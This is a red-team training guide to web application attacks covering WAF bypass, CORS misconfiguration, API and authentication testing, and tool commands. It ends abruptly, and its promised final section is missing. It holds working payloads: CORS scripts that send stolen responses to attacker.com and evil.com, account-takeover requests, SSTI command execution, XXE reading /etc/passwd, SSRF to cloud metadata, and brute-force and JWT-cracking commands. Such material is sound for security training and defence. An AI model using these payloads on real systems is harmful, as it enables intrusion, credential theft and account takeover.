# Red Team Web Application Security — Complete Guide

> A full reference compiled from a red team training session covering WAF bypass, CORS, API testing, authentication, and more.

---

## Table of Contents

1. [WAF Bypass Techniques](#1-waf-bypass-techniques)
2. [CORS Attacks](#2-cors-attacks)
3. [What is CORS](#3-what-is-cors)
4. [Red Team Actions on Misconfigured CORS](#4-red-team-actions-on-misconfigured-cors)
5. [Examples of Wrong CORS Configurations](#5-examples-of-wrong-cors-configurations)
6. [Is CORS Mostly Misconfigured](#6-is-cors-mostly-misconfigured)
7. [Preflight Requests — Deep Dive](#7-preflight-requests--deep-dive)
8. [Exploiting Misconfigured Headers and Content-Type](#8-exploiting-misconfigured-headers-and-content-type)
9. [Step-by-Step Web App Red Teaming](#9-step-by-step-web-app-red-teaming)
10. [API Endpoint Testing](#10-api-endpoint-testing)
11. [What Leads to API Vulnerabilities](#11-what-leads-to-api-vulnerabilities)
12. [How to Know if an API Has Authentication](#12-how-to-know-if-an-api-has-authentication)
13. [Red Team Tools](#13-red-team-tools)
14. [Parameters in API Enumeration](#14-parameters-in-api-enumeration)

---

## 1. WAF Bypass Techniques

### Reconnaissance First

Identify the WAF vendor using `wafw00f`, response headers, and error pages. Find the origin IP directly via Shodan, Censys, historical DNS, or SSL cert transparency logs — if you can hit the origin IP directly, WAF is irrelevant.

### Encoding & Obfuscation

- URL encoding, double encoding, Unicode encoding of payloads
- Case variation (`SeLeCt` instead of `SELECT`)
- Comment injection in SQL (`SEL/**/ECT`)
- Null bytes, whitespace variants (tabs, newlines)

### HTTP-Level Tricks

- Change HTTP method (POST vs GET)
- Chunked transfer encoding to fragment payloads
- Unusual `Content-Type` headers
- IPv6 address of origin if available
- Manipulate `X-Forwarded-For`, `X-Real-IP` headers (some WAFs trust these)

### Payload Fragmentation

- Split payloads across parameters
- Use HPP (HTTP Parameter Pollution)
- Multipart form data to obscure payloads

### Protocol & Path Confusion

- Path traversal variations (`/app/./admin`)
- Adding extra slashes or dots in paths
- Case sensitivity differences between WAF and backend

### Rate & Timing

- Slow down requests to avoid anomaly thresholds
- Rotate IPs/user agents

### Tools

- **sqlmap** with `--tamper` scripts for SQLi bypass
- **Burp Suite** with extensions (Bypass WAF, HackBar)
- **wafw00f** for fingerprinting
- **nuclei** with WAF bypass templates
- **ffuf / wfuzz** with encoding options

---

## 2. CORS Attacks

### 1. Basic Origin Reflection

Server reflects any origin in `Access-Control-Allow-Origin` without validation:

```
GET /api/data HTTP/1.1
Origin: https://attacker.com
```

If response returns `Access-Control-Allow-Origin: https://attacker.com` + `Access-Control-Allow-Credentials: true` — credentials are stolen via malicious site.

### 2. Null Origin Bypass

Some servers whitelist `null` origin (sent by sandboxed iframes). Attacker uses `<iframe sandbox="allow-scripts" src="data:...">` to send null origin and steal data.

### 3. Subdomain Takeover + CORS

If server trusts `*.example.com` and an attacker takes over `sub.example.com` (dangling DNS), they can make cross-origin requests as a trusted origin.

### 4. Regex/Whitelist Bypass

- Trusts `example.com` → attacker registers `evilexample.com`
- Prefix match only → `example.com.evil.com` passes
- Suffix match only → `notexample.com` passes

### 5. CORS + CSRF Combo

If CORS is misconfigured with `credentials: true`, an attacker can read CSRF tokens from API responses and use them to forge state-changing requests.

### 6. Pre-flight Bypass (Simple Requests)

Simple requests (GET, POST with basic headers) don't trigger pre-flight — WAFs/defenses expecting OPTIONS checks are bypassed entirely.

### 7. Internal Network CORS Abuse

Browser-based attacks targeting internal services that trust all origins (common in intranets), pivoting from a public evil page to internal APIs.

### Testing Tools

- **Burp Suite** — manually modify `Origin` header
- **CORScanner** — automated misconfiguration scanner
- **corsy** — Python tool for CORS misconfig detection

### Risk Table

| Finding | Risk |
|---|---|
| Wildcard + credentials | Critical |
| Origin reflection + credentials | Critical |
| Null origin trusted | High |
| Subdomain wildcard | High |
| No credentials but reflection | Low-Medium |

---

## 3. What is CORS

**Cross-Origin Resource Sharing (CORS)** is a browser security mechanism that controls how web pages can request resources from a different origin than the one that served the page.

### What is an Origin?

An origin = **Protocol + Domain + Port**

| URL | Same origin as `https://example.com`? |
|---|---|
| `https://example.com/page` | Yes |
| `http://example.com` | No (different protocol) |
| `https://sub.example.com` | No (different subdomain) |
| `https://example.com:8080` | No (different port) |

### Why CORS Exists

Browsers have a **Same-Origin Policy (SOP)** by default — a page on `evil.com` cannot read responses from `bank.com`. CORS is the mechanism that relaxes SOP in a controlled way when the server explicitly allows it.

### Where CORS Lives

**In the Browser (Enforced Here):** CORS is purely a browser-side enforcement. It lives in the browser's networking layer. curl, Postman, or server-to-server calls — CORS doesn't apply. Only browsers enforce it.

**In HTTP Response Headers (Configured Here):**

```http
Access-Control-Allow-Origin: https://trusted.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 3600
```

**In Server-Side Code:**

```python
# Flask example
response.headers['Access-Control-Allow-Origin'] = '*'
```

```javascript
// Express.js
app.use(cors({ origin: 'https://trusted.com' }))
```

```nginx
# Nginx
add_header Access-Control-Allow-Origin "https://trusted.com";
```

### How the Browser Processes It

```
JS on evil.com makes fetch() to bank.com
        ↓
Browser sends request with "Origin: evil.com" header
        ↓
bank.com responds with (or without) CORS headers
        ↓
Browser checks: Is evil.com in Access-Control-Allow-Origin?
        ↓
NO → Browser blocks JS from reading response
YES → Browser allows JS to read response
```

### Key Point

The server doesn't enforce CORS — it just declares its policy via headers. **The browser is the enforcer.**

---

## 4. Red Team Actions on Misconfigured CORS

### Step 1 — Detect the Misconfiguration

```http
GET /api/userinfo HTTP/1.1
Host: target.com
Origin: https://evil.com
Cookie: session=abc123
```

Check response for:

```http
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

### Step 2 — Identify What Data is Exposed

Look for sensitive endpoints: `/api/profile`, `/api/tokens`, `/api/keys`, `/admin`, `/account`

### Step 3 — Build a PoC

```html
<!-- hosted on attacker.com -->
<script>
  fetch("https://target.com/api/userinfo", {
    method: "GET",
    credentials: "include"
  })
  .then(res => res.text())
  .then(data => {
    fetch("https://attacker.com/steal?data=" + btoa(data));
  });
</script>
```

### Step 4 — Escalate

**Account Takeover:**

```html
<script>
fetch("https://target.com/api/change-email", {
  method: "POST",
  credentials: "include",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ email: "attacker@evil.com" })
});
</script>
```

**Null Origin Bypass:**

```html
<iframe sandbox="allow-scripts allow-top-navigation" srcdoc="
  <script>
    fetch('https://target.com/api/data', {credentials:'include'})
    .then(r=>r.text())
    .then(d=>top.location='https://attacker.com/?d='+btoa(d))
  </script>
"></iframe>
```

### Step 5 — Chain With Other Vulnerabilities

```
CORS misconfiguration
        +
XSS on trusted subdomain     → steal data as trusted origin
CSRF                         → use CORS to read CSRF token first
Subdomain takeover           → become a trusted origin
Stored XSS                   → self-hosted attacker page not needed
```

### Correct CORS Configuration

```javascript
const whitelist = ["https://trusted.com", "https://app.trusted.com"];
if (whitelist.includes(req.headers.origin)) {
  res.header("Access-Control-Allow-Origin", req.headers.origin);
}
```

---

## 5. Examples of Wrong CORS Configurations

### Wildcard with Credentials

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

### Reflecting Any Origin

```javascript
// BAD
res.header("Access-Control-Allow-Origin", req.headers.origin);
res.header("Access-Control-Allow-Credentials", "true");
```

### Broken Regex

```python
# BAD — substring check
if "example.com" in origin:
    return True
# Bypassed by: https://evil-example.com, https://notexample.com
```

```javascript
// BAD — no anchors
if (/example\.com/.test(origin))
// Bypassed by: https://evil-example.com

// GOOD — anchored
if (/^https:\/\/example\.com$/.test(origin))
```

### Trusting Null Origin

```javascript
// BAD
if (origin === "null") {
  res.header("Access-Control-Allow-Origin", "null");
  res.header("Access-Control-Allow-Credentials", "true");
}
```

### HTTP Allowed Instead of HTTPS

```http
Access-Control-Allow-Origin: http://example.com
```

HTTP origin can be intercepted via MITM. Always enforce HTTPS only.

### Misconfiguration Comparison Table

| Config | Vulnerable? | Why |
|---|---|---|
| `ACAO: *` + credentials | Critical | Any origin steals data |
| Reflects request origin | Critical | Attacker origin trusted |
| `null` origin trusted | High | Iframe exploit |
| Substring match | High | Regex bypass |
| HTTP origins allowed | Medium | MITM possible |
| Expired subdomain trusted | High | Subdomain takeover |
| Strict HTTPS whitelist | Safe | Correct approach |

### Correct Configuration

```javascript
const ALLOWED_ORIGINS = [
  "https://app.example.com",
  "https://example.com"
];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (ALLOWED_ORIGINS.includes(origin)) {
    res.header("Access-Control-Allow-Origin", origin);
    res.header("Access-Control-Allow-Credentials", "true");
    res.header("Vary", "Origin"); // important for caching
  }
  next();
});
```

---

## 6. Is CORS Mostly Misconfigured

**Yes — it is one of the most commonly misconfigured security controls on the web.**

### Root Causes

**Developers don't fully understand it** — they just want to fix the browser error quickly:

```javascript
app.use(cors({ origin: "*" }));
// or
res.header("Access-Control-Allow-Origin", req.headers.origin);
```

**Copy-paste from Stack Overflow** — most top-voted CORS solutions suggest `Access-Control-Allow-Origin: *` with no security context.

**CORS errors are annoying in development** — devs disable CORS entirely during dev, then forget to fix before production.

**Frameworks make it too easy to be insecure:**

```python
CORS_ALLOW_ALL_ORIGINS = True  # seen constantly in prod
```

```javascript
app.use(cors()) // no config = wildcard by default
```

**Testing doesn't catch it** — unit tests and QA don't check security headers.

### How Common In the Wild

| Platform Type | CORS Misconfiguration Rate |
|---|---|
| Startups / Small apps | Very High |
| Enterprise internal APIs | High |
| Public APIs | Medium |
| Big Tech | Low (but still found) |

### Where You'll Find It Most

- REST APIs — most common target
- Internal dashboards — often wildcard configured
- Dev/staging servers — left open, exposed publicly
- Microservices — inter-service CORS often too broad
- Legacy backends — old code, never reviewed

---

## 7. Preflight Requests — Deep Dive

### Why Preflight Exists

Browser thinks: "Before I send this potentially dangerous request, let me ask the server first if it's okay."

### Two Types of Requests

**Simple Request (NO preflight)** — must meet ALL conditions:

```
Method:       GET, POST, or HEAD only
Content-Type: application/x-www-form-urlencoded
              multipart/form-data
              text/plain
```

**Complex Request (preflight triggered)** — any of these trigger it:

```
Method:        PUT, DELETE, PATCH, OPTIONS
Headers:       Authorization, X-Custom-Header
Content-Type:  application/json
```

### Preflight Full Flow

```
STEP 1 — JS code runs
fetch("https://api.target.com/data", {
  method: "DELETE",
  headers: { "Authorization": "Bearer token123" },
  credentials: "include"
})

STEP 2 — Browser sends OPTIONS first
OPTIONS /data HTTP/1.1
Origin: https://app.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: Authorization, Content-Type

STEP 3a — Server APPROVES
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.com
Access-Control-Allow-Methods: DELETE, GET, POST
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 3600

STEP 4a — Browser sends actual request
DELETE /data HTTP/1.1
Authorization: Bearer token123

STEP 3b — Server DENIES
HTTP/1.1 200 OK
(no CORS headers)

STEP 4b — Browser STOPS
Actual request never sent
```

### Preflight Caching

```http
Access-Control-Max-Age: 3600
```

| Browser | Max Cache Time |
|---|---|
| Chrome | 7200 seconds (2 hours) |
| Firefox | 86400 seconds (24 hours) |
| Safari | 600 seconds (10 min) |

### Red Team Angle — Preflight Bypass

**Simple Request Smuggling:**

```javascript
fetch("https://target.com/api/action", {
  method: "POST",
  body: "param=malicious_value",
  headers: { "Content-Type": "text/plain" }, // no preflight!
  credentials: "include"
})
// Some backends process this as JSON anyway
```

**Content-Type Trick:**

```javascript
fetch(url, {
  method: "POST",
  body: '{"action":"deleteAccount"}',
  headers: { "Content-Type": "text/plain" } // no preflight!
})
```

### If CORS is Misconfigured — Preflight Also Passes

```
Attacker sends OPTIONS preflight:
Origin: https://evil.com

Misconfigured server responds:
Access-Control-Allow-Origin: https://evil.com ← reflects evil.com
Access-Control-Allow-Methods: DELETE
Access-Control-Allow-Credentials: true

Browser sees: "server approved evil.com"
→ Sends actual DELETE request
→ Attack succeeds
```

**Key Point:**

```
Preflight = Security Guard at door
CORS policy = The rules guard follows

If rules say "let everyone in"
the guard will let everyone in
The RULES are the security — not the guard
```

---

## 8. Exploiting Misconfigured Headers and Content-Type

### Content-Type Manipulation

```javascript
// Bypass preflight — send JSON as text/plain
fetch("https://target.com/api/transfer", {
  method: "POST",
  headers: { "Content-Type": "text/plain" }, // NO preflight!
  body: JSON.stringify({ amount: 1000, to: "attacker" }),
  credentials: "include"
})
// If backend parses body as JSON regardless → CORS+preflight bypassed
```

### X-Forwarded-For / X-Real-IP Spoofing

```http
GET /api/admin HTTP/1.1
Origin: https://evil.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
```

Some servers treat this as an internal/localhost request — bypassing origin checks entirely.

### Missing Vary Header — Cache Poisoning

```http
// BAD — no Vary header
Access-Control-Allow-Origin: https://app.com

// GOOD
Access-Control-Allow-Origin: https://app.com
Vary: Origin
```

Without `Vary: Origin`, a proxy might cache a response with one origin and serve it to another.

### HTTP Method Confusion

```javascript
// PUT triggers preflight — use method override instead
fetch("https://target.com/api/user", {
  method: "POST",
  headers: {
    "Content-Type": "text/plain",
    "X-HTTP-Method-Override": "PUT" // Rails honors this
  },
  body: JSON.stringify({ role: "admin" }),
  credentials: "include"
})
```

### Full Attack Chain Example

```javascript
// Step 1: No preflight via text/plain
// Step 2: Spoof internal IP
// Step 3: Payload executes on server

fetch("https://api.bank.com/payee/add", {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "text/plain",
    "X-Forwarded-For": "127.0.0.1"
  },
  body: '{"action":"addPayee","account":"99999999"}'
})
.then(r => r.json())
.then(d => {
  new Image().src = "https://evil.com/log?r=" + btoa(JSON.stringify(d))
})
```

### Quick Reference Table

| Misconfiguration | Technique | Impact |
|---|---|---|
| Origin reflection | Send any Origin | Critical |
| No Vary header | Cache poisoning | High |
| text/plain accepted | Skip preflight | High |
| X-Forwarded-For trusted | Spoof internal IP | High |
| Method override honored | Bypass PUT/DELETE preflight | Medium |
| HTTP origin whitelisted | MITM attack | Medium |
| Wildcard + credentials | Read any response | Critical |
| Null origin trusted | Sandboxed iframe attack | High |

### Testing Checklist

```bash
# 1. Test origin reflection
curl -H "Origin: https://evil.com" -I https://target.com/api/data

# 2. Test null origin
curl -H "Origin: null" -I https://target.com/api/data

# 3. Test HTTP origin
curl -H "Origin: http://trusted.com" -I https://target.com/api/data

# 4. Test subdomain
curl -H "Origin: https://evil.trusted.com" -I https://target.com/api/data

# 5. Test with credentials
curl -H "Origin: https://evil.com" \
     -H "Cookie: session=test" \
     -I https://target.com/api/data

# 6. Check Vary header
curl -I https://target.com/api/data | grep -i vary
```

---

## 9. Step-by-Step Web App Red Teaming

### Phase 1 — Reconnaissance

```bash
# Passive recon
subfinder -d target.com
amass enum -d target.com

# Google dorks
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com ext:env OR ext:config OR ext:sql

# Historical data
waybackurls target.com
gau target.com

# Certificate transparency
# crt.sh → search target.com

# Active recon
nmap -sV -sC -p- target.com
ffuf -w wordlist.txt -u https://target.com/FUZZ
katana -u https://target.com
```

### Phase 2 — Authentication Testing

```
□ Default credentials (admin:admin, admin:password)
□ Username enumeration (different error messages)
□ No rate limiting on login → brute force
□ Weak password policy
□ MFA bypass
□ JWT misconfiguration
□ Password reset flaws
□ Session fixation
□ Session not invalidated on logout
```

**JWT Testing:**

```bash
python3 jwt_tool.py <token> -T   # tamper
python3 jwt_tool.py <token> -X a # algorithm confusion
```

**Password Reset Testing:**

```
□ Token in URL → leaks via Referer header
□ Weak token → predictable/short
□ Token never expires
□ Token reusable after use
□ Host header injection in reset email
```

### Phase 3 — Authorization Testing

```
□ IDOR (Insecure Direct Object Reference)
□ BOLA (Broken Object Level Authorization)
□ Privilege escalation (horizontal + vertical)
□ Mass assignment
□ BFLA (Broken Function Level Authorization)
```

```bash
# IDOR testing
GET /api/user/1234/profile     → change to /api/user/1235/profile

# Privilege escalation
role=user → role=admin
isAdmin=false → isAdmin=true
```

### Phase 4 — Injection Testing

**SQL Injection:**

```bash
# Manual
' OR '1'='1
' UNION SELECT NULL--

# Automated
sqlmap -u "https://target.com/api/user?id=1" --dbs
sqlmap -u "url" --tamper=space2comment,between,randomcase

# Blind
' AND SLEEP(5)--  # time based
```

**XSS:**

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
```

**SSTI:**

```
{{7*7}}   → if output is 49 = vulnerable
${7*7}
#{7*7}

# RCE via Jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Phase 5 — Application Logic Testing

```
E-commerce:
  quantity=-1           → negative total price
  price=0.001           → manipulate price

Workflow bypass:
  Skip step 2 of 3      → go directly to step 3

Race condition:
  2 simultaneous requests before balance updates
```

### Phase 6 — Security Misconfigurations

```bash
# Check missing headers
curl -I https://target.com

# Missing headers = findings:
□ X-Frame-Options              → clickjacking possible
□ Content-Security-Policy      → XSS easier to exploit
□ X-Content-Type-Options       → MIME sniffing
□ Strict-Transport-Security    → SSL stripping possible

# Exposed sensitive files
/.env
/.git/config
/backup.zip
/phpinfo.php
/actuator          → Spring Boot info leak
/actuator/env      → exposes env variables
/api/swagger.json  → full API documentation exposed
```

### Phase 7 — CORS, CSRF, Clickjacking

```
CORS:
□ Origin reflection + credentials
□ Null origin trusted
□ Wildcard with credentials

CSRF:
□ No CSRF token on state-changing requests
□ CSRF token not validated server side
□ SameSite cookie not set

Clickjacking:
□ X-Frame-Options missing
□ CSP frame-ancestors missing
```

### Phase 8 — File Upload Testing

```bash
# Upload bypass techniques
□ Change Content-Type: image/jpeg but upload .php
□ Double extension: shell.php.jpg
□ Null byte: shell.php%00.jpg
□ Case variation: shell.PHP
□ Magic bytes: add GIF89a; to PHP shell
□ Path traversal in filename: "../../shell.php"
```

### Phase 9 — API Specific Testing

```bash
# API versioning
/api/v1/users  → secured
/api/v0/users  → old version, no auth!
/api/beta/users → dev version exposed

# HTTP method testing — try all methods
GET, POST, PUT, DELETE, PATCH, OPTIONS

# Mass assignment
{"username":"user","password":"pass","role":"admin","isAdmin":true}
```

### Phase 10 — Advanced

```
SSRF:
url=http://169.254.169.254/  ← AWS metadata

XXE:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

GraphQL:
□ Introspection enabled → full schema exposed
□ No query depth limit → DoS
□ Batching attacks → rate limit bypass
```

### Priority Order for Maximum Impact

| Priority | Vulnerability | Reason |
|---|---|---|
| 1 | Authentication bypass | Instant full access |
| 2 | IDOR / BOLA | Access any user data |
| 3 | SQLi | Database dump |
| 4 | SSRF | Internal network access |
| 5 | Stored XSS | Account takeover at scale |
| 6 | CORS misconfiguration | Steal authenticated data |
| 7 | Business logic | Financial impact |
| 8 | File upload RCE | Full server compromise |
| 9 | Security misconfigs | Info disclosure |
| 10 | CSRF | Action on behalf of user |

---

## 10. API Endpoint Testing

### Phase 1 — API Discovery

```bash
# Crawl JS files for endpoints
katana -u https://target.com -jc -o endpoints.txt
linkfinder -i https://target.com/static/app.js -o cli

# Brute force endpoints
ffuf -w /wordlists/api-endpoints.txt \
     -u https://target.com/api/FUZZ \
     -mc 200,201,204,301,302,401,403

# Common doc paths
/swagger.json
/swagger-ui.html
/api-docs
/openapi.json
/graphql
/redoc

# Historical URLs
waybackurls target.com | grep "/api/" | sort -u
gau target.com | grep "api"
```

### Phase 2 — API Versioning Attacks

```bash
# Test every version
for v in v0 v1 v2 v3 v4 beta dev test internal old; do
  curl -s -o /dev/null -w "%{http_code} /api/$v/users\n" \
  https://target.com/api/$v/users
done
```

Why old versions are goldmines:

```
v3 (current): Auth required, rate limited, input validated
v1 (old):     No auth, no rate limit, no input validation, returns more data
```

### Phase 3 — HTTP Method Testing

```bash
# Test all methods
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  echo -n "$method /api/users: "
  curl -s -o /dev/null -w "%{http_code}\n" \
       -X $method https://target.com/api/users \
       -H "Authorization: Bearer <token>"
done
```

**TRACE Method Attack:**

```bash
curl -X TRACE https://target.com/api/users \
     -H "Cookie: session=abc123"
# Server reflects everything including session cookie
```

**Method Override Bypass:**

```bash
# Server blocks DELETE
POST /api/user/123
X-HTTP-Method-Override: DELETE    ← Rails honors this
X-Method-Override: DELETE
```

### Phase 4 — Authentication & Authorization

**BOLA/IDOR:**

```bash
# You are user 100
GET /api/users/100/orders  → your orders (200)
GET /api/users/101/orders  → another user (should 403)
# If 200 = BOLA = critical
```

**Mass Assignment:**

```bash
POST /api/register
{
  "username": "hacker",
  "password": "pass123",
  "role": "admin",         ← mass assignment
  "isAdmin": true,
  "verified": true,
  "credits": 99999
}
```

**JWT Attacks:**

```bash
# Algorithm none attack — change alg to none, remove signature
# Algorithm confusion RS256 → HS256 — sign with public key
# Weak secret brute force
hashcat -a 0 -m 16500 <jwt> wordlist.txt

# JWT Tool
python3 jwt_tool.py <token> -T    # tamper
python3 jwt_tool.py <token> -X a  # alg confusion
python3 jwt_tool.py <token> -C -d wordlist.txt  # crack
```

### Phase 5 — Input Validation

**NoSQL Injection (MongoDB):**

```json
{
  "username": {"$gt": ""},
  "password": {"$gt": ""}
}
```

**Parameter Pollution:**

```
GET /api/transfer?amount=100&to=victim&to=attacker
# PHP takes last → money goes to attacker
```

### Phase 6 — Rate Limiting & Race Conditions

```bash
# Test rate limiting
for i in {1..100}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
  -X POST https://target.com/api/login \
  -d '{"username":"admin","password":"test'$i'"}'
done
# Should return 429 after threshold

# Rate limit bypass headers
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4

# Race condition — send simultaneous requests
curl ... &
curl ... &
wait
```

### Phase 7 — GraphQL

```bash
# Check introspection
POST /graphql
{"query": "{ __schema { types { name } } }"}

# Batching attack → bypass rate limit
[
  {"query": "mutation { login(user:'admin', pass:'pass1') }"},
  {"query": "mutation { login(user:'admin', pass:'pass2') }"}
  ...1000 more
]
# 1000 login attempts in one HTTP request
```

### Phase 8 — SSRF via API

```bash
POST /api/webhook
{ "url": "http://169.254.169.254/latest/meta-data/" }
# AWS metadata → gets IAM credentials

{ "url": "http://localhost/admin" }
# Internal admin panel

# Common SSRF parameters
url=, webhook=, callback=, redirect=, fetch=, load=, src=
```

### Top API Bugs by Impact

| Bug | Impact | Frequency |
|---|---|---|
| BOLA/IDOR | Critical | Very High |
| Broken Auth | Critical | High |
| Mass Assignment | High | High |
| No Rate Limiting | High | Very High |
| SQLi in API | Critical | Medium |
| JWT flaws | Critical | Medium |
| GraphQL introspection | Medium | High |
| SSRF via webhook | Critical | Medium |
| Old API versions | Critical | High |
| Verbose errors | Low-Medium | Very High |

---

## 11. What Leads to API Vulnerabilities

### Root Causes

**Development Speed Over Security:**

```
"Ship fast, fix later"
→ Auth added as afterthought
→ Input validation skipped
→ Rate limiting never implemented
→ Old endpoints never deleted
```

**Developers Trust the Client:**

```javascript
// Developer thinks frontend only sends valid data
// Attacker bypasses frontend entirely via Burp/curl
// Backend has zero validation
```

**No Difference Between Internal & External:**

```
/api/users          ← public
/api/admin/users    ← should be internal only
/api/internal/stats ← should never be exposed
But all on same server, same routing, no separation
```

**Authentication Bolted On Last:**

```javascript
app.use('/api/payment', authMiddleware)  // only payment protected
// Everything else wide open
```

**Trust of HTTP Headers:**

```javascript
const userId = req.headers['x-user-id']  // attacker controls this!
```

**Over-Returning Data:**

```javascript
return db.getUser(userId)  // returns EVERYTHING including password_hash, secret_key
```

### What To Do After Enumeration

**Step 1 — Map Auth Requirements:**

```bash
for endpoint in $(cat endpoints.txt); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
         https://target.com$endpoint)
  echo "$code $endpoint"
done
```

**Step 2 — Test Every ID for IDOR:**

```bash
for id in {1..100}; do
  curl -s https://target.com/api/v1/users/$id \
       -H "Authorization: Bearer <token>" \
       -o /dev/null -w "$id: %{http_code}\n"
done
```

**Step 3 — Fuzz Hidden Parameters:**

```bash
ffuf -w params.txt \
     -u "https://target.com/api/v1/users?FUZZ=test" \
     -mc 200 -fw 10

# Common hidden params:
?debug=true, ?admin=true, ?internal=true, ?export=true
```

**Step 4 — Abuse Export Endpoints:**

```bash
GET /api/v1/export?type=users      → all users data?
GET /api/v1/export?url=http://169.254.169.254/  → SSRF
```

**Step 5 — Attack Webhooks (SSRF):**

```bash
POST /api/v1/webhook
{ "url": "http://169.254.169.254/latest/meta-data/" }
{ "url": "http://10.0.0.1/api/internal" }
```

**Step 6 — Chain Vulnerabilities:**

```
Chain 1: IDOR + Mass Assignment = Account Takeover
  GET /api/v1/users/1  → get admin email
  PUT /api/v1/users/1 { "email": "attacker@evil.com", "role": "admin" }

Chain 2: No Auth + Export = Full DB Dump
  GET /api/v1/export?type=users&format=csv  → no auth needed

Chain 3: SSRF + Internal API = Full Infrastructure
  webhook → AWS metadata → IAM credentials → full cloud access
```

---

## 12. How to Know if an API Has Authentication

### Simple Test — Remove Token and Try

```bash
# WITH auth
curl https://target.com/api/users \
     -H "Authorization: Bearer eyJhbG..."
→ 200 OK + data

# WITHOUT auth
curl https://target.com/api/users
→ 401? = auth required
→ 200? = NO AUTH = critical bug
```

### Identify Auth Mechanism

```bash
# Look for these request headers:
Authorization: Bearer eyJhbGci...     ← JWT token
Authorization: Basic dXNlcjpwYXNz    ← Basic auth
Authorization: ApiKey abc123xyz       ← API key
Cookie: session=abc123                ← Session cookie
X-API-Key: abc123xyz                  ← Custom header
```

### Test Auth Removal Systematically

```bash
# Remove header completely
# Send empty value: Authorization:
# Send null: Authorization: null
# Send invalid: Authorization: Bearer invalid123
```

### Response Meanings

| Response | Meaning |
|---|---|
| 401 Unauthorized | Auth required, correctly enforced |
| 403 Forbidden | Auth works but no permission |
| 200 OK | NO AUTH = critical finding |
| 500 Error | Might be auth bypass via error |

### Auth Bypass Techniques

**Path Traversal:**

```bash
/api/admin/          ← trailing slash
/API/admin           ← uppercase
/api/./admin         ← dot traversal
/api//admin          ← double slash
/api/admin;test      ← semicolon
/api/v1/../admin     ← directory traversal
```

**IP Spoofing:**

```bash
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
# Server treats as internal → skips auth
```

**Old API Version:**

```bash
GET /api/v2/users → 401  # secured
GET /api/v1/users → 200  # forgotten, no auth
GET /api/v0/users → 200  # even older, no auth
```

**Parameter Based:**

```bash
GET /api/admin/users?debug=true    → 200?
GET /api/admin/users?internal=true → 200?
GET /api/admin/users?bypass=true   → 200?
```

### Token Validation Testing

```bash
# Expired token — should 401, if 200 = tokens never expire
# Modified JWT — change userId in payload, keep same signature
# Wrong signature — if 200 = signature not checked
# Algorithm none — change alg to none, remove signature
```

### Tools

```
Burp Suite → Repeater → Delete Authorization header
Autorize (Burp Extension) → tests every request without auth automatically
ffuf → bulk endpoint testing
nuclei → auth check templates
```

**Golden rule:** Never assume an endpoint is protected just because others are. Test every single one individually.

---

## 13. Red Team Tools

### Reconnaissance

```bash
# Subdomain discovery
subfinder -d target.com -o subs.txt
amass enum -d target.com -o amass.txt
assetfinder target.com | tee assets.txt

# URL discovery
waybackurls target.com | tee wayback.txt
gau target.com | tee gau.txt
katana -u https://target.com -jc -o crawl.txt

# Technology fingerprinting
whatweb https://target.com
httpx -l all-subs.txt -tech-detect -o live.txt
```

### Scanning

```bash
# Port scanning
nmap -sV -sC -p- target.com
masscan -p1-65535 target.com --rate=1000

# Vulnerability scanning
nuclei -u https://target.com -t cves/
nuclei -u https://target.com -t exposures/
nuclei -u https://target.com -t misconfiguration/
nikto -h https://target.com

# Directory bruteforce
ffuf -w /wordlists/common.txt -u https://target.com/FUZZ
gobuster dir -u https://target.com -w wordlist.txt
feroxbuster -u https://target.com --depth 3
```

### Burp Suite Extensions

```
Autorize      → auth bypass testing
JWT Editor    → JWT attacks
Param Miner   → find hidden params
Turbo Intruder → race conditions
Active Scan++ → better scanning
Hackvertor    → payload encoding
Logger++      → advanced logging
CORS*         → CORS testing
```

### Injection Tools

```bash
# SQLMap
sqlmap -u "https://target.com/api/user?id=1" --dbs
sqlmap -u url --cookie="session=abc123"
sqlmap -u url --tamper=space2comment,between,randomcase

# XSS
dalfox url "https://target.com/search?q=test"
cat urls.txt | dalfox pipe
python3 xsstrike.py -u "https://target.com/search?q=test"

# Command injection
commix --url="https://target.com/ping?host=INJECT_HERE"
```

### API Testing

```bash
# Parameter discovery
arjun -u https://target.com/api/users
arjun -u https://target.com/api/users -m JSON

# API route bruteforcing
kr scan https://target.com -w routes-large.kite -o results.txt

# GraphQL
python3 graphw00f.py -t https://target.com/graphql
```

### Authentication

```bash
# JWT attacks
python3 jwt_tool.py <token> -T    # tamper
python3 jwt_tool.py <token> -X a  # alg confusion
python3 jwt_tool.py <token> -C -d wordlist.txt  # crack
hashcat -a 0 -m 16500 <jwt> wordlist.txt

# Password brute force
hydra -l admin -P wordlist.txt target.com http-post-form \
      "/login:username=^USER^&password=^PASS^:Invalid"
```

### SSRF & XXE

```bash
# SSRFmap
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Interactsh — SSRF/blind callback listener
interactsh-client
# Use generated URL: {"url": "https://abc123.oast.fun"}

# XXEinjector
ruby XXEinjector.rb --host=attacker.com --file=request.txt --path=/etc/passwd
```

### CORS Testing

```bash
python3 cors_scan.py -u https://target.com
python3 corsy.py -u https://target.com
curl -H "Origin: https://evil.com" -I https://target.com/api/data | grep -i "access-control"
```

### Automation Pipeline

```bash
# Full recon pipeline
subfinder -d target.com -silent | \
httpx -silent | \
katana -silent | \
grep "api" | \
nuclei -t vulnerabilities/ -o vulns.txt

# Find subdomains → check takeover
